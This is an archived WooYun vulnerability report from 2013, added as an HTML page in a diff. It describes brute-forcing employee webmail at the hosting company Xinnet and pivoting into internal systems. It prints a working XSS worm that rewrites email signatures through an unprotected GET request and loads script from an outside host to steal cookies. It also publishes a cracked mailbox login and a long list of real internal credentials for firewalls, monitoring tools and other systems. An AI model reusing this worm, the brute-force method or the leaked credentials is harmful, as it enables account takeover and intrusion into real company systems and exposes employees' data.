@@ -1,0 +1,303 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		从一个司机的邮箱开始测试新网（Zabbix、cacti、Zenoss、BSS、防火墙、VPN等N多系统沦陷）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		从一个司机的邮箱开始测试新网（Zabbix、cacti、Zenoss、BSS、防火墙、VPN等N多系统沦陷）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/贱心">贱心</a> 
+</li><li>提交时间：		2013-09-09 14:33</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-09：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-14：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">一直觉得企业的邮箱系统是企业安全环节中一个很脆弱的点，哪怕是互联网公司也同样如此。<br />
+Zabbix、cacti、Zenoss、BSS、防火墙、VPN、mrtg监控、网站投诉监查系统、WEARE系统、MRTG服务器、多个机房的跳板机、数码庄园ABC座设备账号密码等等 可导致部分用户vps、域名、邮局等账号密码泄露 至于财务信息 比较敏感 这里就不说了</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">首先我通过百度、谷歌、大数据库等方式收集了一些新网的邮箱地址，从找到的一些新网的员工姓名又生成了一些邮箱地址<br />
+<br />
+我把这些可能的新网邮箱的用户名整理出来，对其进行了爆破。<br />
+<br />
+</p><pre><code>http://webmail.xinnet.com</code></pre><p class='detail'><br />
+<br />
+不得不说，很幸运，我爆破得到了一个新网司机的邮箱帐号和密码。<br />
+<br />
+</p><pre><code>liubing@xinnet.com   123456</code></pre><p class='detail'><br />
+<br />
+可能有的同学觉得一个司机的邮箱能有什么用，里面不会有什么重要的东西的<br />
+<br />
+里面确实没什么重要的邮件 ps：新网司机的工资挺低的<br />
+<br />
+但我们找到了这个<br />
+<br />
+</p><p class="detail"><a href="../images/0911554993f78d39a273355a779df02bf4bc3377.jpg" target="_blank"><img src="../images/0911554993f78d39a273355a779df02bf4bc3377.jpg" alt="QQ截图20130909115325.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+好吧 这可比我辛辛苦苦收集的多了好几倍<br />
+<br />
+把800多个邮箱拿到burp上再爆破一次<br />
+<br />
+额~ 吓我一跳啊 800多个邮箱竟然有近百个是弱口令 员工们这安全意识大大的有待提高啊<br />
+<br />
+</p><p class="detail"><a href="../images/0914120259a21906c3ad17a5d42000194b2c8738.jpg" target="_blank"><img src="../images/0914120259a21906c3ad17a5d42000194b2c8738.jpg" alt="QQ截图20130909141126.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+这里就帮这些同学打码了 免的挨骂 不过如果你是弱口令 记得改密码哦<br />
+<br />
+在近百个邮箱里找到了几个技术人员的邮箱，只找到了个zabbix，看来这几个是底层的员工<br />
+<br />
+可是就这么爆破点儿邮箱，找了个zabbix就提交上来多丢人啊<br />
+<br />
+我们的目标是运维的同学 他们掌握这大量系统的权限 <br />
+<br />
+OK 我们继续<br />
+<br />
+仔细看了下新网的邮箱系统 发现应该可以直接写html<br />
+<br />
+</p><p class="detail"><a href="../images/09120450cb9c9acacb9ed33d272f901e05a6ec0a.jpg" target="_blank"><img src="../images/09120450cb9c9acacb9ed33d272f901e05a6ec0a.jpg" alt="QQ截图20130909120417.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+貌似还有签名，good 我们可以把签名里写上xss代码，这样他下次写邮件给其他同事 他的同事也会中招 <br />
+<br />
+等等 我们看下修改签名 发现无token等验证 而且get请求也可以 那我们岂不是可以构造个蠕虫了？！<br />
+<br />
+</p><pre><code>http://webmail.xinnet.com/app/mailset/mailSign/operate?method=addMailSignature&amp;sigId=&amp;isHtml=false&amp;sigSubject=%E9%BB%98%E8%AE%A4%E7%AD%BE%E5%90%8D&amp;defaultSig=true&amp;signatureContent=签名内容</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+先试试可不可以xss吧 我把他的默认签名修改为<br />
+<br />
+</p><pre><code>&lt;script src=http://xssplatform.xss.com/xss?1378700262&gt;&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+我们发一封测试邮件试试<br />
+<br />
+</p><p class="detail"><a href="../images/091219114bfff68ff43b85668d673c4c2bfdeb92.jpg" target="_blank"><img src="../images/091219114bfff68ff43b85668d673c4c2bfdeb92.jpg" alt="QQ截图20130909121853.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+你妹啊，这是什么情况？怎么收到的是一个ip的cookie？<br />
+<br />
+难道读邮件的时候是在这个ip上读？那我们岂不是无法获取到webmail.xinnet.com域上的cookie么（看来新网的技术人员是考虑到xss的）<br />
+<br />
+失败了 难道就这样结束了么？<br />
+<br />
+好吧 把人家签名改回去 走人吧<br />
+<br />
+可天无绝人之路 就在再次打开邮件签名设置的时候 我收到了一条cookie<br />
+<br />
+</p><pre><code>location : http://webmail.xinnet.com/app/mailset/mailSign/set</code></pre><p class='detail'><br />
+<br />
+可以确认这里有个xss 那就好办了<br />
+<br />
+我们来写个超简单的蠕虫吧<br />
+<br />
+</p><pre><code>if(localStorage.getItem(&#039;a&#039;)!=&#039;1&#039;){<br />
+s=document.createElement(&quot;iframe&quot;);s.style.display=&quot;none&quot;;s.src=&quot;http://webmail.xinnet.com/app/mailset/mailSign/operate?method=addMailSignature&amp;sigId=&amp;isHtml=false&amp;sigSubject=%E9%BB%98%E8%AE%A4%E7%AD%BE%E5%90%8D&amp;defaultSig=true&amp;signatureContent=%3cscript%20src%3dhttp:%2f%2fxssplatform.xss.com%2fxss%3f1378195725%3e%3c%2fscript%3e&quot;;document.body.appendChild(s);<br />
+localStorage.setItem(&#039;a&#039;,&#039;1&#039;);<br />
+}<br />
+b=document.createElement(&quot;iframe&quot;);b.style.display=&quot;none&quot;;b.src=&quot;http://webmail.xinnet.com/app/mailset/mailSign/set&quot;;document.body.appendChild(b);</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/091232513b06fb289ca11c50e766bc7fbd755eb5.jpg" target="_blank"><img src="../images/091232513b06fb289ca11c50e766bc7fbd755eb5.jpg" alt="QQ截图20130909123219.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+上图是收获的cookie<br />
+<br />
+那这有什么用呢？看看下面我们在邮箱内容里找到的收获吧<br />
+<br />
+</p><pre><code>mrtg监控流量:http://123.100.0.40 gzidc/gzidc<br />
+url：http://58.30.217.121/index.php?reconnect=1<br />
+用户名：zabbix监控<br />
+密码：xinnet123<br />
+http://114.112.53.50/cacti<br />
+用户名：cactimonitor<br />
+密码：  xinnet123<br />
+http://121.14..187/complaintCenter/<br />
+http://121.14.4.178/complaintCenter/<br />
+http://121.14.4.229/ComplaintCenter/portal/jsp/login/login.jsp<br />
+http://121.14.4.228/ComplaintCenter/portal/jsp/login/login.jsp<br />
+账号：zbliuhui@xinnet.com<br />
+密码：1<br />
+防火墙地址：<br />
+http://114.112.53.45:28099/<br />
+用户名：xinnet<br />
+密码：xinnet123!@#<br />
+http://61.155.153.248:28099<br />
+用户名：xinnet<br />
+密码：xinnet123!@#<br />
+http://58.30.238.114:28099<br />
+用户名：xinnet<br />
+密码：xinnet123!@#<br />
+http://monitor.300.cn:8080/zport/dmd/Events/evconsole<br />
+U:  viewer<br />
+P:   viewer#.)<br />
+http://fuwu.myxinnet.com/<br />
+王斌47<br />
+赫英惠<br />
+霍森<br />
+赵越<br />
+闫均<br />
+123465<br />
+http://yy.myxinnet.com/DisposeSearch.aspx?InspectId=X121031173<br />
+test<br />
+123456<br />
+李荣<br />
+123456<br />
+登录weare.xinnet.com，用户名：gd-shiyongqi,密码：gd-shiyongqi</code></pre><p class='detail'><br />
+<br />
+还有好多系统 就不全列出来了<br />
+<br />
+如果是真正的骇客 还会对其他地方下手 可想而知会有什么危害。<br />
+<br />
+蠕虫已关闭不会继续传播和获取cookie 不过还是要清掉签名里xss代码 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/0913223404681d990019dd8a67a835cc9bdfbe14.jpg" target="_blank"><img src="../images/0913223404681d990019dd8a67a835cc9bdfbe14.jpg" alt="QQ截图20130909132120.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/09135330d73153a08cb7e216ead4e5714827c03c.jpg" target="_blank"><img src="../images/09135330d73153a08cb7e216ead4e5714827c03c.jpg" alt="QQ截图20130909134331.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/091354155187fc131e50c1cf897336d5d29d2694.jpg" target="_blank"><img src="../images/091354155187fc131e50c1cf897336d5d29d2694.jpg" alt="QQ截图20130909135301.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/09135628190dffd5936080fef7e0d15c7b05182c.jpg" target="_blank"><img src="../images/09135628190dffd5936080fef7e0d15c7b05182c.jpg" alt="QQ截图20130909135536.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/09135952383fa944e0dfec9c6539d58ad8de114f.jpg" target="_blank"><img src="../images/09135952383fa944e0dfec9c6539d58ad8de114f.jpg" alt="QQ截图20130909135915.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/091402552821c7c4192eae8be40585f371acc16d.jpg" target="_blank"><img src="../images/091402552821c7c4192eae8be40585f371acc16d.jpg" alt="QQ截图20130909140105.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/09140337a0a632cf1c5a5c1a6714c91fb5370190.jpg" target="_blank"><img src="../images/09140337a0a632cf1c5a5c1a6714c91fb5370190.jpg" alt="QQ截图20130909140140.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/091409353b169e506c398bf6c22e6a0c895d20e0.jpg" target="_blank"><img src="../images/091409353b169e506c398bf6c22e6a0c895d20e0.jpg" alt="QQ截图20130909140609.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/09140953bbc57be2a4f276a6e0a319a9a6893125.jpg" target="_blank"><img src="../images/09140953bbc57be2a4f276a6e0a319a9a6893125.jpg" alt="QQ截图20130909140905.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/091415119efbb9f5a6953141c49349ee0691fc02.jpg" target="_blank"><img src="../images/091415119efbb9f5a6953141c49349ee0691fc02.jpg" alt="QQ截图20130909113033.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/091417170c851618b8029270be54d5aba64ec311.jpg" target="_blank"><img src="../images/091417170c851618b8029270be54d5aba64ec311.jpg" alt="QQ截图20130909141632.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/091418554bc0abbd6d8e7802cf5aed8a6062b707.jpg" target="_blank"><img src="../images/091418554bc0abbd6d8e7802cf5aed8a6062b707.jpg" alt="QQ截图20130909141831.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/0914282332051d2687c05bb81ffc18909b799f96.jpg" target="_blank"><img src="../images/0914282332051d2687c05bb81ffc18909b799f96.jpg" alt="QQ截图20130909142212.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/09142847ebb9d4bbdd8b8c5d56c3d5e3769bca9e.jpg" target="_blank"><img src="../images/09142847ebb9d4bbdd8b8c5d56c3d5e3769bca9e.jpg" alt="QQ截图20130909142034.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+还有好多系统 就不全列出来了 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">也许新网运维们看到这个会痛恨我<br />
+<br />
+但总比有一天真的遇到骇客了 遭受损失才加强安全好得多<br />
+<br />
+司机是无辜的 只是躺枪 弱口令的邮箱太多了 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/贱心" title="贱心">贱心</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-036551" title="从一个司机的邮箱开始测试新网（Zabbix、cacti、Zenoss、BSS、防火墙、VPN等N多系统沦陷）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-09-09 14:33</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+													<p class="detail">漏洞Rank：20 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="36551";
+var bugRating="2";
+var myRating="";
+var ratingCount="5";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
